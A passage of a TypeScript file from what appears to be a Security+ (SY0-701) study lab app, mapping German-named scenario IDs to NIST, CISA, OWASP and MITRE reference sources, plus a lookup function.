  'bedrohungen-supply-chain-sbom': [SY0_701, 'cisa-sbom', 'cisa-secure-by-design'],
  'bedrohungen-mitigation-mapping': [SY0_701, 'owasp-top10-2021', 'cisa-phishing-social-engineering', 'nist-csf-2'],
  'bedrohungen-passwort-angriffe': [SY0_701, 'owasp-credential-stuffing', 'mitre-attack-enterprise'],
  'bedrohungen-netzwerk-angriffe': [SY0_701, 'mitre-attack-enterprise'],
  'bedrohungen-web-app-angriffe': [SY0_701, 'owasp-top10-2021'],

  'firewalls-geo-block': [SY0_701, 'cisco-acl', 'paloalto-security-policy-rules'],
  'firewalls-implicit-deny': [SY0_701, 'cisco-acl'],
  'firewalls-segmentierung': [SY0_701, 'nist-sp-800-207', 'cisa-zero-trust-maturity-model'],
  'firewalls-egress': [SY0_701, 'cisco-acl', 'paloalto-security-policy-rules', 'mitre-attack-enterprise'],
  'firewalls-shadowed-rule': [SY0_701, 'cisco-acl', 'paloalto-security-policy-rules'],
  'firewalls-east-west-microseg': [SY0_701, 'nist-sp-800-207', 'paloalto-security-policy-rules'],
  'firewalls-nat-publishing': [SY0_701, 'cisco-acl'],
  'firewalls-waf-actions': [SY0_701, 'owasp-top10-2021'],
  'firewalls-admin-access': [SY0_701, 'nist-csf-2', 'paloalto-security-policy-rules'],
  'firewalls-vpn-split-tunnel': [SY0_701, 'nist-sp-800-207', 'cisco-acl'],
  'firewalls-log-triage': [SY0_701, 'cisco-acl', 'paloalto-security-policy-rules'],
  'firewalls-zero-trust-pep': [SY0_701, 'nist-sp-800-207', 'cisa-zero-trust-maturity-model'],
  'firewalls-ids-ips-platzierung': [SY0_701, 'nist-sp-800-94'],
  'firewalls-nac-8021x': [SY0_701, 'nist-sp-800-97'],

  'architektur-cloud-modelle': [SY0_701, 'aws-shared-responsibility'],
  'architektur-datenzustaende': [SY0_701, 'nist-encryption-basics'],
  'architektur-resilienz': [SY0_701, 'nist-csf-2'],
  'architektur-backup-321': [SY0_701, 'cisa-stopransomware-guide', 'nist-csf-2'],
  'architektur-shared-responsibility-matrix': [SY0_701, 'aws-shared-responsibility'],
  'architektur-ha-failover': [SY0_701, 'nist-csf-2', 'cisa-stopransomware-guide'],
  'architektur-data-sanitization': [SY0_701, 'nist-sp-800-88r2-ipd'],
  'architektur-container-hardening': [SY0_701, 'owasp-top10-2021', 'nist-csf-2'],
  'architektur-ot-ics-iot': [SY0_701, 'nist-sp-800-82r3'],
  'architektur-failure-modes': [SY0_701, 'nist-sp-800-94', 'nist-csf-2'],

  'iam-aaa': [SY0_701, 'nist-sp-800-63b'],
  'iam-mfa-faktoren': [SY0_701, 'nist-sp-800-63b'],
  'iam-offboarding': [SY0_701, 'nist-csf-2', 'nist-sp-800-63b'],
  'iam-least-privilege': [SY0_701, 'nist-sp-800-63b', 'nist-csf-2'],
  'iam-access-control-modelle': [SY0_701, 'nist-sp-800-63b'],
  'iam-conditional-access': [SY0_701, 'nist-sp-800-63b', 'nist-sp-800-207'],
  'iam-pam-jit': [SY0_701, 'nist-sp-800-63b', 'nist-csf-2'],
  'iam-federation-flow': [SY0_701, 'nist-sp-800-63b'],
  'iam-sso-protokolle': [SY0_701, 'nist-sp-800-63c'],
  'iam-passwort-richtlinie': [SY0_701, 'nist-sp-800-63b'],

  'betrieb-server-haertung': [SY0_701, 'cis-benchmarks', 'nist-sp-800-40r4'],
  'betrieb-wlan-sicherheit': [SY0_701, 'wifi-alliance-security', 'nist-sp-800-97'],
  'betrieb-mobile-deployment': [SY0_701, 'nist-sp-800-124r2'],
  'betrieb-asset-lifecycle': [SY0_701, 'nist-sp-800-88r2-ipd', 'nist-csf-2'],
  'betrieb-vuln-priorisierung': [SY0_701, 'first-cvss-v31', 'cisa-kev'],
  'betrieb-patch-notfall': [SY0_701, 'nist-sp-800-40r4', 'cisa-kev'],
  'betrieb-scan-arten': [SY0_701, 'nist-sp-800-115'],
  'betrieb-siem-tuning': [SY0_701, 'nist-sp-800-92'],
  'betrieb-monitoring-werkzeuge': [SY0_701, 'nist-sp-800-92'],
  'betrieb-email-authentisierung': [SY0_701, 'nist-sp-800-177r1'],
  'betrieb-soar-playbook': [SY0_701, 'nist-sp-800-61r3', 'cisa-phishing-social-engineering'],
  'betrieb-automation-usecases': [SY0_701, 'nist-sp-800-61r3'],

  'ir-nist-phasen': [SY0_701, 'nist-sp-800-61r2'],
  'ir-ransomware-first-response': [SY0_701, 'nist-sp-800-61r2', 'cisa-stopransomware-guide'],
  'ir-log-quellen': [SY0_701, 'nist-sp-800-61r2', 'mitre-attack-enterprise'],
  'ir-chain-of-custody': [SY0_701, 'nist-sp-800-61r2'],
  'ir-severity-triage': [SY0_701, 'nist-sp-800-61r2', 'nist-sp-800-61r3'],
  'ir-containment-strategy': [SY0_701, 'nist-sp-800-61r2', 'cisa-stopransomware-guide'],
  'ir-forensic-volatility': [SY0_701, 'nist-sp-800-61r2'],
  'ir-communications-plan': [SY0_701, 'nist-sp-800-61r2', 'nist-sp-800-61r3'],
  'ir-edr-timeline': [SY0_701, 'mitre-attack-enterprise', 'nist-sp-800-61r2'],
  'ir-recovery-validation': [SY0_701, 'cisa-stopransomware-guide', 'nist-csf-2'],
  'ir-phishing-report-flow': [SY0_701, 'cisa-phishing-social-engineering', 'nist-sp-800-61r2'],
  'ir-lessons-learned-actions': [SY0_701, 'nist-sp-800-61r2', 'nist-csf-2'],
  'ir-uebungsformate': [SY0_701, 'nist-sp-800-84', 'nist-sp-800-61r2'],
  'ir-threat-hunt-hypothese': [SY0_701, 'mitre-attack-enterprise', 'nist-sp-800-61r3'],

  'krypto-bausteine': [SY0_701, 'nist-encryption-basics', 'nist-sp-800-57r5'],
  'krypto-cert-lifecycle': [SY0_701, 'nist-sp-800-57r5'],
  'krypto-tls-fehler': [SY0_701, 'nist-encryption-basics', 'nist-sp-800-57r5'],
  'krypto-hash-einsatz': [SY0_701, 'nist-sp-800-57r5'],
  'krypto-key-lifecycle': [SY0_701, 'nist-sp-800-57r5'],
  'krypto-aead-hmac-signatur': [SY0_701, 'nist-encryption-basics', 'nist-sp-800-57r5'],
  'krypto-pki-chain': [SY0_701, 'nist-sp-800-57r5'],
  'krypto-secret-storage': [SY0_701, 'nist-sp-800-57r5', 'nist-csf-2'],
  'krypto-obfuskation': [SY0_701, 'nist-encryption-basics'],
  'krypto-zertifikatstypen': [SY0_701, 'nist-sp-800-57r5'],

  'governance-risk-response': [SY0_701, 'nist-csf-2'],
  'governance-datenrollen': [SY0_701, 'nist-csf-2'],
  'governance-policy-typen': [SY0_701, 'nist-csf-2'],
  'governance-audit-ablauf': [SY0_701, 'nist-csf-2'],
  'governance-third-party-risk': [SY0_701, 'cisa-sbom', 'nist-csf-2'],
  'governance-awareness-plan': [SY0_701, 'cisa-phishing-social-engineering', 'nist-csf-2'],
  'governance-audit-evidence': [SY0_701, 'nist-csf-2'],
  'governance-quantitatives-risiko': [SY0_701, 'nist-sp-800-30r1'],
  'governance-vertragsdokumente': [SY0_701, 'nist-csf-2'],
  'governance-datenschutz-rollen': [SY0_701, 'eu-gdpr'],
}

const labSourceById = new Map(LAB_SOURCES.map(source => [source.id, source]))

export function getLabScenarioSources(scenarioId: string): LabSource[] {
  return (LAB_SCENARIO_SOURCE_REFS[scenarioId] ?? [])
    .map(sourceId => labSourceById.get(sourceId))
    .filter((source): source is LabSource => Boolean(source))
}
